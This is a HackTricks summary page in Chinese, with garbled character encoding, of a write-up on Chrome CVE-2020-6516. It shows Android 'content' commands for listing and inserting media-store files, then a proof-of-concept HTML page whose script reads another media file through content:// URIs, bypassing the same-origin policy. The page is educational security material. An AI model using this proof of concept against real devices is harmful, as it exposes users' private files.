{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**è¿™æ˜¯å¸–å­ [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/) çš„æ‘˜è¦**

### åˆ—å‡ºåª’ä½“å­˜å‚¨ä¸­çš„æ–‡ä»¶
è¦åˆ—å‡ºåª’ä½“å­˜å‚¨ç®¡ç†çš„æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š
```bash
$ content query --uri content://media/external/file
```
ä¸ºäº†æ›´äººæ€§åŒ–çš„è¾“å‡ºï¼Œä»…æ˜¾ç¤ºæ¯ä¸ªç´¢å¼•æ–‡ä»¶çš„æ ‡è¯†ç¬¦å’Œè·¯å¾„ï¼š
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
å†…å®¹æä¾›è€…è¢«éš”ç¦»åœ¨å…¶è‡ªå·±çš„ç§æœ‰å‘½åç©ºé—´ä¸­ã€‚è®¿é—®æä¾›è€…éœ€è¦ç‰¹å®šçš„ `content://` URIã€‚æœ‰å…³è®¿é—®æä¾›è€…çš„è·¯å¾„çš„ä¿¡æ¯å¯ä»¥ä»åº”ç”¨ç¨‹åºæ¸…å•æˆ–Androidæ¡†æ¶çš„æºä»£ç ä¸­è·å¾—ã€‚

### Chromeå¯¹å†…å®¹æä¾›è€…çš„è®¿é—®
Androidä¸Šçš„Chromeå¯ä»¥é€šè¿‡ `content://` æ–¹æ¡ˆè®¿é—®å†…å®¹æä¾›è€…ï¼Œä»è€Œè®¿é—®ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºå¯¼å‡ºçš„èµ„æºï¼Œå¦‚ç…§ç‰‡æˆ–æ–‡æ¡£ã€‚ä¸ºäº†è¯´æ˜è¿™ä¸€ç‚¹ï¼Œå¯ä»¥å°†æ–‡ä»¶æ’å…¥åˆ°åª’ä½“åº“ä¸­ï¼Œç„¶åé€šè¿‡Chromeè®¿é—®ï¼š

å°†è‡ªå®šä¹‰æ¡ç›®æ’å…¥åª’ä½“åº“ï¼š
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
å‘ç°æ–°æ’å…¥æ–‡ä»¶çš„æ ‡è¯†ç¬¦ï¼š
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
è¯¥æ–‡ä»¶å¯ä»¥é€šè¿‡ä½¿ç”¨æ–‡ä»¶æ ‡è¯†ç¬¦æ„å»ºçš„ URL åœ¨ Chrome ä¸­æŸ¥çœ‹ã€‚

ä¾‹å¦‚ï¼Œè¦åˆ—å‡ºä¸ç‰¹å®šåº”ç”¨ç¨‹åºç›¸å…³çš„æ–‡ä»¶ï¼š
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Same-Origin-Policy Bypass

_åŒæºç­–ç•¥_ (SOP) æ˜¯æµè§ˆå™¨ä¸­çš„ä¸€ç§å®‰å…¨åè®®ï¼Œé™åˆ¶ç½‘é¡µä¸æ¥è‡ªä¸åŒæºçš„èµ„æºè¿›è¡Œäº¤äº’ï¼Œé™¤éé€šè¿‡è·¨æºèµ„æºå…±äº« (CORS) ç­–ç•¥æ˜ç¡®å…è®¸ã€‚è¯¥ç­–ç•¥æ—¨åœ¨é˜²æ­¢ä¿¡æ¯æ³„éœ²å’Œè·¨ç«™è¯·æ±‚ä¼ªé€ ã€‚Chrome å°† `content://` è§†ä¸ºæœ¬åœ°æ–¹æ¡ˆï¼Œè¿™æ„å‘³ç€æ›´ä¸¥æ ¼çš„ SOP è§„åˆ™ï¼Œå…¶ä¸­æ¯ä¸ªæœ¬åœ°æ–¹æ¡ˆ URL è¢«è§†ä¸ºä¸€ä¸ªå•ç‹¬çš„æºã€‚

ç„¶è€Œï¼ŒCVE-2020-6516 æ˜¯ Chrome ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå…è®¸é€šè¿‡ `content://` URL ç»•è¿‡ SOP è§„åˆ™ã€‚å®é™…ä¸Šï¼Œæ¥è‡ª `content://` URL çš„ JavaScript ä»£ç å¯ä»¥è®¿é—®é€šè¿‡ `content://` URL åŠ è½½çš„å…¶ä»–èµ„æºï¼Œè¿™åœ¨å®‰å…¨ä¸Šæ˜¯ä¸€ä¸ªé‡å¤§é—®é¢˜ï¼Œå°¤å…¶æ˜¯åœ¨è¿è¡Œ Android 10 ä¹‹å‰ç‰ˆæœ¬çš„ Android è®¾å¤‡ä¸Šï¼Œå› ä¸ºè¿™äº›ç‰ˆæœ¬æœªå®ç°èŒƒå›´å­˜å‚¨ã€‚

ä¸‹é¢çš„æ¦‚å¿µéªŒè¯æ¼”ç¤ºäº†è¿™ä¸ªæ¼æ´ï¼Œå…¶ä¸­ä¸€ä¸ª HTML æ–‡æ¡£åœ¨ **/sdcard** ä¸‹ä¸Šä¼ å¹¶æ·»åŠ åˆ°åª’ä½“åº“ä¸­ï¼Œä½¿ç”¨å…¶ JavaScript ä¸­çš„ `XMLHttpRequest` è®¿é—®å¹¶æ˜¾ç¤ºåª’ä½“åº“ä¸­å¦ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œç»•è¿‡äº† SOP è§„åˆ™ã€‚

Proof-of-Concept HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
